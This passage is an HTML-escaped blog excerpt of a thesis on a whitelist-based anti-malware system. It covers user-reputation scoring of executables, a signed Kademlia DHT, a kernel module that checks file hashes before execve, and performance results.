+&lt;p&gt;where &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+n_e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; n_e &quot; class=&quot;latex&quot; /&gt; is the number of reports collected for the executable file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt; , within the time window &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt; .  Therefore, the final updated score &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_e &quot; class=&quot;latex&quot; /&gt; at the end of the time window &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt; can be characterized by Eq. : &lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_e%28t+%2B+T%29+%3D+%5Csigma_e%28t%29+%2B+%5Cmu_e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_e(t + T) = \sigma_e(t) + \mu_e &quot; class=&quot;latex&quot; /&gt; .&lt;/p&gt;
+
+
+
+&lt;p&gt;When the &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_e &quot; class=&quot;latex&quot; /&gt; score exits from the interval &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5B-1%2C1%5D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; [-1,1] &quot; class=&quot;latex&quot; /&gt; , the executable file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt; is classified as &lt;em&gt;reliable&lt;/em&gt; if positive or &lt;em&gt;malicious&lt;/em&gt; otherwise, and the reports previously sent by users for &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt; will contribute to update their reputation. If the report &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+s_e%5Eu+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; s_e^u &quot; class=&quot;latex&quot; /&gt; is consistent with the classification just carried out (the sign matches), the reputation of the user &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt; grows, otherwise it decreases. More precisely, the value &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_u &quot; class=&quot;latex&quot; /&gt; will increase or decrease according to its value at time &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+t+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; t &quot; class=&quot;latex&quot; /&gt;, based on two coefficients of proportionality, namely, &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+a+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; a &quot; class=&quot;latex&quot; /&gt; and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+b+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; b &quot; class=&quot;latex&quot; /&gt;, both defined in the range &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5B0%2C1%5D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; [0,1] &quot; class=&quot;latex&quot; /&gt; , as follows:
+&lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_u%28t+%2B+T%29+%3D+%5Cbegin%7Bcases%7D+%5Clceil+r_u%28t%29+%2B+%5CDelta_u%28t%29%5Crceil%5E1+%26+%5Cquad+%5Ctext%7Bif+%7D+%5Csigma_e%28t+%2B+T%29+%5Cin+%5B-1%2C1%5D+%5Ctext%7B+and+%7D+%5Csigma_e%28t%29+%5Cnotin+%5B-1%2C1%5D++%5C%5C+%5Clceil+%281+%2B+a%29r_u%28t%29+%5Crceil%5E1+%26+%5Cquad+%5Ctext%7Bif+%7D+%28%5Csigma_e%28t+%2B+T%29+%5Cnotin+%5B-1%2C1%5D+%5Ctext%7B+and+%7D+%5Csigma_e%28t%29+%5Cin+%5B-1%2C1%5D%29+%5Ctext%7B+and+%7D+%28%5Cnu%28s_e%5Eu%29+%3D+%5Cnu%28%5Csigma_e%28t+%2B+T%29%29%29+%5C%5C+%281+-+b%29r_u%28t%29+%26+%5Cquad+%5Ctext%7Bif+%7D+%28%5Csigma_e%28t+%2B+T%29+%5Cnotin+%5B-1%2C1%5D+%5Ctext%7B+and+%7D+%5Csigma_e%28t%29+%5Cin+%5B-1%2C1%5D%29+%5Ctext%7B+and+%7D+%28%5Cnu%28s_e%5Eu%29+%5Cne+%5Cnu%28%5Csigma_e%28t+%2B+T%29%29%29++%5Cend%7Bcases%7D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_u(t + T) = \begin{cases} \lceil r_u(t) + \Delta_u(t)\rceil^1 &amp;amp; \quad \text{if } \sigma_e(t + T) \in [-1,1] \text{ and } \sigma_e(t) \notin [-1,1]  \\ \lceil (1 + a)r_u(t) \rceil^1 &amp;amp; \quad \text{if } (\sigma_e(t + T) \notin [-1,1] \text{ and } \sigma_e(t) \in [-1,1]) \text{ and } (\nu(s_e^u) = \nu(\sigma_e(t + T))) \\ (1 - b)r_u(t) &amp;amp; \quad \text{if } (\sigma_e(t + T) \notin [-1,1] \text{ and } \sigma_e(t) \in [-1,1]) \text{ and } (\nu(s_e^u) \ne \nu(\sigma_e(t + T)))  \end{cases} &quot; class=&quot;latex&quot; /&gt;  &lt;/p&gt;
+
+
+
+&lt;p&gt;where:&lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=%5Clceil+x%5Crceil%5Ey+%3D+%5Cbegin%7Bcases%7D+y+%26+%5Cquad+%5Ctext%7Bif+%7D+x+%3E+y+%5C%5C+x+%26+%5Cquad+%5Ctext%7Botherwise+%7D+%5Cend%7Bcases%7D++++%5Cnu%28x%29+%3D+%5Cbegin%7Bcases%7D+1+%26+%5Cquad+%5Ctext%7Bif+%7D+x+%3C+0+%5C%5C+0+%26+%5Cquad+%5Ctext%7Botherwise+%7D+%5Cend%7Bcases%7D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;\lceil x\rceil^y = \begin{cases} y &amp;amp; \quad \text{if } x &amp;gt; y \\ x &amp;amp; \quad \text{otherwise } \end{cases}    \nu(x) = \begin{cases} 1 &amp;amp; \quad \text{if } x &amp;lt; 0 \\ 0 &amp;amp; \quad \text{otherwise } \end{cases} &quot; class=&quot;latex&quot; /&gt;
+&lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5CDelta_u%28t%29+%3D+%5Cbegin%7Bcases%7D+0+%26+%5Cquad+%5Ctext%7Bif+%7D+r_u%28t+-+T%29+%5Ctext%7B+is+undefined+%7D+%5C%5C+r_u%28t%29+-+r_u%28t+-+T%29+%26+%5Cquad+%5Ctext%7B+otherwise+%7D+%5Cend%7Bcases%7D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \Delta_u(t) = \begin{cases} 0 &amp;amp; \quad \text{if } r_u(t - T) \text{ is undefined } \\ r_u(t) - r_u(t - T) &amp;amp; \quad \text{ otherwise } \end{cases} &quot; class=&quot;latex&quot; /&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Reasonable values for the two coefficients of proportionality could be &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+a+%3D+0.1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; a = 0.1 &quot; class=&quot;latex&quot; /&gt; and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+b+%3D+0.5+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; b = 0.5 &quot; class=&quot;latex&quot; /&gt; . In this way, a user who makes a series of correct reports will gradually see his reputation grow, until it reaches the maximum value allowed. Instead, a user who makes a wrong report, will see his reputation halved. Therefore, this choice allows to give a greater weight to incorrect reports, so as to discourage any attacks on the system. In fact, when &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_u+%3C+0.01+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_u &amp;lt; 0.01 &quot; class=&quot;latex&quot; /&gt;, the user &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt; will be no longer able to make reports. &lt;/p&gt;
+
+
+
+&lt;p&gt;Finally, if the value &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_e &quot; class=&quot;latex&quot; /&gt; returns within the interval &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5B-1%2C1%5D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; [-1,1] &quot; class=&quot;latex&quot; /&gt; ,
+each user to whom the reputation was increased (or decreased)
+will be subtracted (or added) a value equal to the increment
+(or to the decrease) previously received.
+&lt;/p&gt;
+
+
+
+&lt;h4&gt;System Architecture&lt;/h4&gt;
+
+
+
+&lt;p&gt;The architecture of the proposed solution involves the use of a distributed hash table and a kernel module for trapping execution, which is loaded by the operating system. The aim of the overall model is to classify a very large number of executable files and to manage the numerous reports coming from users, regarding the score of the executable files they are going to execute. However, it is important to remark that the number of such requests is potentially enormous, since the system could send a request for every file it tries to execute. For this reason, it is not appropriate to make reliability scores available by means of a centralized service architecture, since it could represent a performance bottleneck as well as a Single Point Of Failure (SPOF) and hence it could be easily vulnerable to DoS attacks. Inspired by these design criteria, our model is based on a hybrid architecture, composed of a Central Server for collecting users’ reports and a DHT based on Kademlia, for handling the interface to the scoring system in a fully distributed and replicated way. Kademlia employs a recursive algorithm for node lookups, routing queries and locating nodes within a topology driven by a XOR-based distance metric between points in the key space. Since such metric is fully symmetric, each participant node receives lookup queries from exactly the same distribution of nodes contained in their routing tables. As a consequence, lookup operations return with an extremely high probability a key-value pair stored in &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Clceil+logn%5Crceil+%2B+c+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \lceil logn\rceil + c &quot; class=&quot;latex&quot; /&gt; , where &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+n+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; n &quot; class=&quot;latex&quot; /&gt; is the number of nodes and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+c+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; c &quot; class=&quot;latex&quot; /&gt; is a small constant characterizing the operation. &lt;/p&gt;
+
+
+
+&lt;div class=&quot;wp-block-image&quot;&gt;&lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/github.com/gdecostanzo/MalwareKernelModule/raw/master/Documentation/Images/architecture.jpeg?w=720&amp;amp;ssl=1&quot; alt=&quot;&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt; &lt;br /&gt; System architecture. &lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+
+&lt;p&gt;In detail, the DHT stores the key-value pairs, consisting of the hash of an executable file and its associated score, together with a timestamp information. We remark that in our proposal, the nodes of the P2P overlay allow the writing only to the Central Server, which represents an &lt;em&gt;authoritative entity&lt;/em&gt;, while anyone can read and request the score for an executable. The limitation in writing is guaranteed by the use of a digital signature scheme, used whenever a (hash, score) key-value pair is sent for storage on DHT. However, only signing this pair could make the system vulnerable to replay attacks. Indeed, any attacker could be able to capture a message sent on the P2P overlay, and then read the key- value pair and its digital signature. Again, the attacker could keep this message and re-send it later, thus succeeding in restoring the old score associated with an executable file. To overcome this problem, we use a time stamp indicating the expiration time for a specific message. More formally, let &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5CPi+%3D+%28Gen%2CSign%2CVerify%29+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \Pi = (Gen,Sign,Verify) &quot; class=&quot;latex&quot; /&gt; be a generic digital signature scheme. Let &lt;img src=&quot;https://s0.wp.com/latex.php?latex=TTP_%7Bpriv%7D&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;TTP_{priv}&quot; class=&quot;latex&quot; /&gt; and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=TTP_%7Bpub%7D&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;TTP_{pub}&quot; class=&quot;latex&quot; /&gt; be the keys needed to sign and verify a given message using &lt;img src=&quot;https://s0.wp.com/latex.php?latex=%5CPi&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;\Pi&quot; class=&quot;latex&quot; /&gt; , respectively. The &lt;img src=&quot;https://s0.wp.com/latex.php?latex=TTP&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;TTP&quot; class=&quot;latex&quot; /&gt; sends the following message (i.e., up) to the P2P overlay: &lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt; &lt;img src=&quot;https://s0.wp.com/latex.php?latex=up+%3D+%28hash%2C+score%2C+timestamp%2C+signature%29&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;up = (hash, score, timestamp, signature)&quot; class=&quot;latex&quot; /&gt; &lt;/p&gt;
+
+
+
+&lt;p&gt;where &lt;em&gt;signature&lt;/em&gt; is computed by Eq. as follows ( ∥ denotes the concatenation symbol ):&lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=signature+%3D+Sign_%7BTTP_%7Bpriv%7D%7D%28hash+%5Cparallel+score+%5Cparallel+timestamp%29&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;signature = Sign_{TTP_{priv}}(hash \parallel score \parallel timestamp)&quot; class=&quot;latex&quot; /&gt;   &lt;/p&gt;
+
+
+
+&lt;p&gt;Within the &lt;em&gt;up&lt;/em&gt; message, &lt;em&gt;hash&lt;/em&gt; represents the &lt;em&gt;key&lt;/em&gt;, while the triple &lt;em&gt;(score, timestamp, signature)&lt;/em&gt; denotes the &lt;em&gt;value &lt;/em&gt;to be stored in the DHT, respectively. The use of the stored signature allows an accessing entity to check the integrity and genuinity of any entry stored on the DHT, by using the public key &lt;img src=&quot;https://s0.wp.com/latex.php?latex=TTP_%7Bpub%7D&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot;TTP_{pub}&quot; class=&quot;latex&quot; /&gt; , available through a recognized PKI infrastructure. Thus, the digital signature is calculated by adding also a validity end date (&lt;em&gt;timestamp&lt;/em&gt;), which makes the generated message unusable after a certain period of time. We stress that the Central Server acts as a &lt;em&gt;Trusted Third Party (TTP)&lt;/em&gt;, since it is the only entity which holds the private key used to sign the messages, as well as it is trusted by all other entities belonging to the system. Nowadays, many systems are based on &lt;em&gt;TTPs&lt;/em&gt; to perform their operations in a fair and secure manner. For example, &lt;em&gt;TTPs&lt;/em&gt; find scope of application in fair exchange protocols, authentication and certification systems, etc. Again, &lt;em&gt;TTPs&lt;/em&gt; are used to incentivize honest behavior in some reputation-based systems and e-auction protocols. In detail, the Central Server collects all the reports received from the authenticated users and updates the scores of the executable files when the time window expires, by sending a signed message (&lt;em&gt;up&lt;/em&gt;) containing the new value to the nodes of the DHT overlay. In the proposed system, the users are authenticated through a client certificate, issued to them by a CA at the end of a registration process, carried out to provide an appropriate verification of user identity. &lt;/p&gt;
+
+
+
+&lt;p&gt;User reputations are kept on the Central Server, which updates them and establishes who is allowed to send reports. It is important to emphasize that the separation of roles between the Central Server and the Kademlia DHT overlay guarantees that, even in the event of a server failure (due to an attack or technical problems), users’ operating systems are always able to determine whether an executable file is &lt;em&gt;reliable &lt;/em&gt;or &lt;em&gt;malicious&lt;/em&gt;, since this information can be obtained by the DHT. Again, we remark that the use of a DHT ensures reliability and availability of the data at any time, since Kademlia is known to provide provable consistency and performance also within fault-prone environments . Finally, the software layer on the user system, used to check the executable file before its execution, is implemented through a kernel module. The main idea is to hijack the &lt;em&gt;execve &lt;/em&gt;system call. Hence, before any file execution, the kernel module calculates the &lt;em&gt;SHA-256 &lt;/em&gt;hash of such a file and verifies its score, by sending a request to the DHT. If the file is classified as &lt;em&gt;reliable&lt;/em&gt;, then it is executed normally, otherwise, if it is classified as &lt;em&gt;malicious &lt;/em&gt;or has not yet received reports, the kernel module will prevent execution until it is not been classified as reliable. However, this design has the following two drawbacks:&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Latency&lt;/strong&gt;: every &lt;em&gt;execve &lt;/em&gt;system call needs to query the DHT before it can be executed. Obviously, this can cause system performance degradation also if Kademlia ensures response in a logarithmic time on the number of nodes, that have enough knowledge and flexibility to route queries through low-latency paths. In addition, Kademlia issues parallel asynchronous queries for mitigating the effects of timeout delays from failed nodes. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Mandatory connection to the network&lt;/strong&gt;: to determine if a file can be executed, an Internet connection is required to perform a verification on the Kademlia network. Thus, a disconnected system would be unusable. &lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;To overcome such two limitations, we introduce a &lt;em&gt;local cache&lt;/em&gt;, where the scores for each executable file are stored. In detail, this cache initially contains only the hashes of all the executable files belonging to the operating system and our system assigns to these files permanent execution permissions. In this way, a normal use of the system is still possible even without an Internet connection. In addition, for each executable file for which a check is performed on the DHT, the relative score is temporarily stored in the cache. By doing so, it is possible to avoid an access to the DHT for each further execution of a file. Thus, when a valid entry is present within the cache, such entry is used to drive the execution process. However, cache entries have a limited lifetime (that can be typically chosen as the length of the time slot &lt;em&gt;T&lt;/em&gt; ) and all the cached data, when a connection is available, are automatically refreshed at their expiration through a new access to the DHT, so that updates to reliability scores are taken into account without affecting users’ execution performances. Notice that though this solution does not completely solve the latency problem, since there will still be a search in the cache for each execution, we can certainly say that the times are considerably reduced. Furthermore, a user with root privileges will be able to run new trusted files by adding them to the local cache (i.e. new compiled program files, or copied from trusted source).&lt;br /&gt;The figure below shows a diagram which outlines how the kernel module works within the proposed system. &lt;/p&gt;
+
+
+
+&lt;div class=&quot;wp-block-image&quot;&gt;&lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/github.com/gdecostanzo/MalwareKernelModule/raw/master/Documentation/Images/architecture2.jpeg?w=720&amp;amp;ssl=1&quot; alt=&quot;&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt; &lt;br /&gt; Kernel module operation scheme. &lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+
+&lt;h2&gt;Architecture Design and Implementation &lt;/h2&gt;
+
+
+
+&lt;p&gt;In this section we outline the design and implementation aspects of a proof of concept reflecting the architecture presented above. More precisely, in this section we focus on the design and implementation of both the kernel module for blocking the execution of &lt;em&gt;malicious &lt;/em&gt;executable files and of the verification system accessible through the Kademlia overlay DHT. &lt;br /&gt;&lt;br /&gt;The &lt;em&gt;PoC&lt;/em&gt; (Proof of Concept) code is publicly available on my &lt;a href=&quot;https://github.com/gdecostanzo/MalwareKernelModule&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; aria-label=&quot; (opens in a new tab)&quot;&gt;GitHub&lt;/a&gt;, and has been made on &lt;em&gt;Ubuntu 12.04.1&lt;/em&gt; OS with kernel version &lt;em&gt;3.2.0-29-generic&lt;/em&gt;. The choice is due to the ease with which it was possible to perform the hijacking of a system call, as explained below.&lt;/p&gt;
+
+
+
+&lt;h4&gt;&lt;em&gt;Execution Trapping Kernel Module &lt;/em&gt;&lt;/h4&gt;
+
+
+
+&lt;p&gt;The implemented kernel module is characterized by the following three main functionalities: &lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt; Hijacking of the &lt;em&gt;execve &lt;/em&gt;system call, through &lt;em&gt;hooking &lt;/em&gt;of the system call table; &lt;/li&gt;&lt;li&gt; &lt;em&gt;SHA-256 &lt;/em&gt;hashing of the executable file; &lt;/li&gt;&lt;li&gt; Checking the executable’s score, by connecting to the Kademlia network.&lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt; &lt;em&gt;1) &lt;strong&gt;Hijacking&lt;/strong&gt;: &lt;/em&gt;In order to hijack the &lt;em&gt;execve &lt;/em&gt;system call, we use a fairly common technique, namely, the &lt;em&gt;hooking &lt;/em&gt;of the system call table. In detail, the processes in the user space call a series of interrupts to the kernel space, which are stored in a predefined table during the Linux system initialization process. The pointers to different interrupt management functions are then stored. The idea is to appropriately manipulate these pointers within the table, in order to insert the desired actions. At the end of the added actions, the action of the original system call is then restored, to avoid crashes or anomalies in the operating system.  &lt;br /&gt;&lt;br /&gt;2) &lt;em&gt;&lt;strong&gt;Hashing&lt;/strong&gt;: &lt;/em&gt;Once the system call has been hijacked, we can add the piece of code we want to execute. In our case, this code is inserted into the &lt;em&gt;new execve &lt;/em&gt;function. Our goal is to check the reliability of a given file before it is executed. The system then calculates a &lt;em&gt;SHA-256 &lt;/em&gt;hash of that file to verify its relative score. If the executable file is considered as &lt;em&gt;reliable&lt;/em&gt;, then the original system call is executed, thus guaranteeing the normal behavior of the system. Otherwise, the system call will not be executed. &lt;br /&gt;&lt;br /&gt;3) &lt;em&gt;&lt;strong&gt;Verification&lt;/strong&gt;:&lt;/em&gt; The final step is to verify the reliability of the executable file, by using the calculated hash. The verification is carried out by connecting to the Kademlia network or looking inside the local cache if it is not the first execution of the file. However, it is important to point out that for the development of a kernel module, not all the standard libraries normally used in user space C programming are available. To overcome this limitation, we use a &lt;em&gt;local socket&lt;/em&gt;, which connects the kernel module with an application executed in user space. More precisely, we use an &lt;em&gt;AF UNIX &lt;/em&gt;connection type, which allows the communication between a client and a server running on the same host, without the need to have an IP address. In detail, for the bind operation it is used a file descriptor, which points to a file within the local file system. Thus, the kernel module acts as a client, connecting to the application interfacing with the DHT and managing the local cache, executed in user space, which acts as a server (i.e., a daemon process) and waits for connections. When the kernel module makes a request to the server, it receives a Boolean value through which it determines whether or not it can execute the file. &lt;/p&gt;
+
+
+
+&lt;h4&gt;Kademlia&lt;/h4&gt;
+
+
+
+&lt;p&gt;For the realization of the DHT we started from an already existing implementation, written in Python and available on &lt;a href=&quot;https://github.com/isaaczafuta/pydht&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; aria-label=&quot;GitHub (opens in a new tab)&quot;&gt;GitHub&lt;/a&gt;. In this section, we focus on the changes made to this existing code. The goal of our Kademlia implementation is to allow the write operation on the nodes only to a single authoritative entity. This is achieved through the use of a digital signature scheme. In detail, all nodes know the public key of the TTP and can verify the signature of an incoming store request message as well as the authenticity of a retrieved value. On the other hand, only the Central Server holding the private key is able to write on the DHT nodes. The changes on the Kademlia implementation were carried out within the &lt;em&gt;STORE &lt;/em&gt;and &lt;em&gt;FIND &lt;/em&gt;functions, where each Kademlia node, before storing the content, checks the signature and the timestamp, thus ensuring the authenticity of the message and the security with respect to &lt;em&gt;Replay attacks&lt;/em&gt;. Analogously any lookup operation within the DHT before returning results performs a check of the aforementioned &lt;em&gt;signature&lt;/em&gt; fields by using the public key of the TTP. &lt;/p&gt;
+
+
+
+&lt;h2&gt;Experimentation and Results&lt;/h2&gt;
+
+
+
+&lt;p&gt; In this section we provide implementation details about the proof of concept developed to assess the effectiveness and the performance of our proposal. Such assessment has clearly shown that the framework does not significantly impact neither the runtime performance of users’ executions nor the overall operating system activity. &lt;br /&gt;&lt;br /&gt;The &lt;em&gt;Proof of Concept&lt;/em&gt; (PoC) code is publicly available on &lt;a rel=&quot;noreferrer noopener&quot; href=&quot;https://github.com/gdecostanzo/MalwareKernelModule&quot; target=&quot;_blank&quot;&gt;GitHub&lt;/a&gt;, and has been made on &lt;em&gt;Ubuntu 12.04.1&lt;/em&gt; OS with kernel version &lt;em&gt;3.2.0-29-generic&lt;/em&gt;. The choice is due to the ease with which it was possible to perform the hijacking of a system call.&lt;/p&gt;
+
+
+
+&lt;h4&gt;&lt;em&gt;Execution test &lt;/em&gt;&lt;/h4&gt;
+
+
+
+&lt;p&gt;As a sample untrusted executable, we created and compiled the “Hello World” &lt;em&gt;C &lt;/em&gt;program shown below:&lt;/p&gt;
+
+
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;#include &lt;stdio.h&gt;
+int main()
+{ printf (&quot;Hello World! \n&quot;); }&lt;/stdio.h&gt;&lt;/pre&gt;
+
+
+
+&lt;p&gt;Since this program never executed, its hash is not present neither in the local cache nor on the DHT. Thus, such a program must not be executed by the system once the kernel module is loaded. As additional sample trusted executables we used the &lt;em&gt;/bin/ls&lt;/em&gt; and &lt;em&gt;/bin/uname&lt;/em&gt; standard Linux commands, whose reliability score has been pre-asserted on the DHT. &lt;/p&gt;
+
+
+
+&lt;h4&gt;System performance&lt;/h4&gt;
+
+
+
+&lt;p&gt;To evaluate the performance of our proposed framework, we analyzed the execution times of the aforementioned programs before and after loading the kernel module, as well as when the reliability information is already located in the local cache or it is yet in the DHT, in order to appreciate the latency introduced by both the caching mechanism and DHT access. The tests were carried out by means of a virtual machine running on an external hard drive at 5400 &lt;em&gt;RPM&lt;/em&gt;, connected to the host system via &lt;em&gt;USB &lt;/em&gt;3.0. The resources assigned to the virtual machine are 1 &lt;em&gt;GB RAM &lt;/em&gt;and a single core of the &lt;em&gt;Intel Core i7 &lt;/em&gt;processor at 2.2 &lt;em&gt;GHz&lt;/em&gt;. The total elapsed time necessary to execute the sample applications with and without using the kernel module, and when information is already store in the cache or need to be accessed on the DHT, measured through the Linux &lt;em&gt;time &lt;/em&gt;command is shown in the table below, where average values from 10 runs have been reported. &lt;/p&gt;
+
+
+
+&lt;img src=&quot;assets/posts/thesis/results.png&quot; alt=&quot;&quot; class=&quot;wp-image-1581&quot; /&gt;&lt;figcaption&gt; &lt;br /&gt; Execution time of some programs (in msecs) with and without Kernel Module execution Trap and DHT access &lt;/figcaption&gt;&amp;lt;/figure&amp;gt;&lt;/div&gt;
+
+&lt;p&gt;We can appreciate that when the information is successfully cached, the average latency introduced by the execution of a program by the kernel module is negligible. Therefore, after the first execution of a file, which requires the connection to the Kademlia network and hence takes a longer time, due to both access to the P2P overlay and signature checking, all the following runs are impacted in a very limited way, respect to the enormous advantages introduced in terms of the overall system security. &lt;/p&gt;
+
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;We presented a novel lightweight solution to deal with unknown malware execution. Unlike most of the existing protection mechanisms, which are based on the concept of &lt;em&gt;blacklists&lt;/em&gt;, this work relies on a &lt;em&gt;whitelist&lt;/em&gt;-based approach, which is more conservative and can be summarized by the aphorism “prevention is better than cure”. We have realized the system architecture according to a hybrid logic and coupled it with a component that manages the reputation of users who contribute to the malware classification. The proposed system guarantees data persistence, that is, the availability of information even in the event of malfunctions or attacks. Furthermore, in this work we describe how to prevent different types of attacks that can subvert the reputation of the system. Finally, we show that the latency introduced by our system for the execution of a given file is acceptable, due to the use of a local cache. &lt;br /&gt;&lt;br /&gt;The presented system, surely brings limits of use on Desktop OS, due to the enormous number of runned applications, and for the new ones installed. However it represents an interesting and effective solution for server systems, or embedded systems for IoT.&lt;/p&gt;</content><author><name>Giovanni De 